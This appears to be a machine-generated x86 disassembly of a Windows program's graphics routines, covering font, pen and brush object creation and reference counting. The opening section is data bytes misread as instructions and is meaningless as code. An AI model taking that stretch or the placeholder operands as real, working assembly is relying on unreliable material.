add [ eax ] bh
inc edi
inc ecx
add [ eax + 0x47 ] al
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ebp + ebx + 0x33e00041 ] bh
inc eax
add ah ch
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
insd
outsd
jo r-xdata
mov eax eax
nop
mov bl 0x41
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
jl r-xdata
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41b2d490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0x41 ] bh
jae r-xdata
rcl [ eax + 0x30041b3 ] 0xb
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ edx + 0x66060041 ] dh
jae r-xdata
popad
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
xor eax [ eax ]
inc ecx
add al ah
xor eax [ eax ]
in al dx
outsb
je r-xdata
inc edi
jb r-xdata
leave
inc ecx
add [ edi ] cl
push esp
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0xb390c08b
inc ecx
or [ eax + 0x6d ] esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4c ] ah
inc ecx
inc ecx
popad
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ ebx + esi * 4 + 0x62070041 ] cl
jae r-xdata
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
dec ebp
push eax
outsb
insb
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41b1d890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add [ eax ] al
movsb [ edi ] [ esi ]
mov ah 0x41
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
imul esp [ ebx + 0x73 ] 0xffff0001
nop
sub [ ebp + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xb5
inc ecx
add [ eax - 0x4b ] bl
inc ecx
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edi * 2 - 0x4c ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ eax - 0x4c ] ch
insb
nop
inc edi
push esp
mov ah 0x41
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
popad
imul esp [ ebx + 0x73 ] 0x41b45490
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
call [ ecx + ecx * 8 + 0x540f0041 ]
jo r-xdata
dec ebp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x4b ] al
inc ecx
add [ esi - 0x4b ] cl
inc ecx
pop eax
mov ch 0x41
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edx * 2 - 0x4c ] si
inc ecx
add [ eax ] dh
push ds
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec ebp
jb r-xdata
outsb
add [ eax + eax ] ah
add [ eax ] al
or [ ecx + eax * 2 + 0x4033e000 ] dh
add ah ch
dec esi
mov ch 0x41
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
xor eax [ eax ]
mov ah 0x41
add al ah
xor eax [ eax ]
in al dx
imul esp [ ebx + 0x73 ] 0xc08b0000
test al 0xb4
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc eax
add [ ecx + esi + 0x40 ] cl
add [ esp + ecx * 8 + 0x47380041 ] ah
inc ecx
add [ eax + 0x47 ] al
inc ecx
add al ch
int3
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
dec esp
int3
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + esi * 4 + 0x200041 ] ah
add [ eax ] al
add [ eax ] eax
std
jo r-xdata
sub_41ba7c
push esi
mov edx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov ebx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebx - 0x44cfffbf ] bh
inc ecx
add [ eax ] ch
add [ eax ] al
add [ esi + ebx + 0x33e00041 ] ch
inc eax
add al bh
inc edi
inc ecx
add al dh
xor eax [ eax ]
hlt
sub_41bbd1
mov ebx 0x41
add [ eax ] al
sub [ ecx + eax * 2 + 0x41bc5800 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov esp 0xbc480041
inc ecx
add [ eax + eax ] ch
add [ eax ] al
lodsb [ esi ]
push ds
inc ecx
add al ah
xor eax [ eax ]
clc
inc edi
inc ecx
add al dh
xor eax [ eax ]
hlt
sub_41c0ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_41c11c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41c158
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41c194
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41c108
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41c17c
xor edx edx
push ebp
push sub_41c268
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c26f
mov eax [ ebp - 0x4 ]
call sub_41c188
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407c90
test al al
je r-xdata
sub_41c278
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c17c
xor ecx ecx
push ebp
push sub_41c2ff
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c188
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41c328
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c17c
xor eax eax
push ebp
push sub_41c391
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c194
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41c278
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c398
mov eax [ ebp - 0x4 ]
call sub_41c188
retn
mov eax ebx
mov si 0xfffd
call sub_403394
sub_41c3a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c17c
xor eax eax
push ebp
push sub_41c3fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c403
mov eax [ ebp - 0x4 ]
call sub_41c188
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403394
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c278
sub_41c40c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c17c
xor edx edx
push ebp
push sub_41c46b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c472
mov eax [ ebp - 0x4 ]
call sub_41c188
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41c478
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_414404
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c515
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414098
mov ebx eax
mov eax ebx
call sub_41da6c
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41dd80
mov eax [ rw-data ]
call sub_41c40c
mov eax [ rw-data ]
call sub_41c40c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c51c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_414468
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_414098
call sub_41dc58
inc esi
dec ebx
jne r-xdata
sub_41cb6b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413af8
retn
sub_41cb9c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402cb4
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a88
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41cc50
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c194
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41cca4
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c278
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41cce8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414654
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c9a8
xor eax eax
push ebp
push sub_41cda3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c9a8
xor eax eax
push ebp
push sub_41cd86
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c3a0
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41ce24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd8d
mov eax [ ebp - 0x8 ]
call sub_41c9b8
retn
mov eax ebx
call sub_41d0a8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d0c4
sub_41cdd4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c9a8
xor eax eax
push ebp
push sub_41ce19
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce20
mov eax [ ebp - 0x4 ]
call sub_41c9b8
retn
sub_41ce38
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cfc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cfc8
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f0c
retn
mov eax [ rw-data ]
call sub_41c17c
xor eax eax
push ebp
push sub_41cf99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c188
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40414c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40875c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40414c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_40875c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40414c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407dc8
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41d11c
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41cfe0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41cb9c
mov edx esp
mov eax ebx
call sub_41cdd4
add esp 0x2c
pop esi
pop ebx
retn
sub_41d00c
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cdbc
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41cdd4
add esp 0x2c
pop esi
pop ebx
retn
sub_41d04c
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41cdbc
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b98
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404184
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a88
mov edx esp
mov eax ebx
call sub_41cdd4
sub_41d0c4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41d00c
pop esi
pop ebx
retn
sub_41d0f0
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41cdbc
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41cdd4
add esp 0x30
pop ebx
retn
sub_41d124
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cdbc
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41cdd4
add esp 0x2c
pop esi
pop ebx
retn
sub_41d154
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cdbc
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41cdd4
add esp 0x2c
pop esi
pop ebx
retn
sub_41d17c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c194
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41d1c0
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c278
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41d1e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414654
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c9a8
xor eax eax
push ebp
push sub_41d287
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c9a8
xor eax eax
push ebp
push sub_41d26a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c3a0
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d3f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d271
mov eax [ ebp - 0x8 ]
call sub_41c9b8
retn
sub_41d2a0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d2b8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c9a8
xor eax eax
push ebp
push sub_41d2fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d304
mov eax [ ebp - 0x4 ]
call sub_41c9b8
retn
sub_41d310
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d2a0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d2b8
add esp 0x10
pop esi
pop ebx
retn
sub_41d338
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c17c
xor eax eax
push ebp
push sub_41d3be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c188
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c964
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41d3d0
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] edx
mov edx esp
call sub_41d2b8
add esp 0x10
pop edi
pop esi
retn
sub_41d40c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d2a0
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41d2b8
add esp 0x10
pop esi
pop ebx
retn
sub_41d43c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d2a0
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41d2b8
sub_41d468
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c194
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41d4a8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c278
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_41d4d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414654
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c9a8
xor eax eax
push ebp
push sub_41d560
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c9a8
xor eax eax
push ebp
push sub_41d543
push [ fs : eax ]
mov [ fs : eax ] esp
